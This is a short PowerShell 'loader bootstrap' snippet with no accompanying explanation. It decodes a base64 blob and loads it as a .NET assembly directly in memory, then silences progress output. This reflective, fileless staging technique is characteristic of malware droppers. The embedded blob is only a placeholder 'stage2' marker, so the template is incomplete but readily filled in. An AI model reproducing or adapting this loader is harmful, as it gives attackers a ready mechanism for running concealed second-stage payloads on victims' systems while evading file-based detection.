
<# Loader bootstrap #> $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp3YW16eW56d2py'); $TransferResult = [Reflection.Assembly]::Load($PayloadBytes); $TransferResult.GetTypes().Count; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $ProgressPreference = "SilentlyContinue"
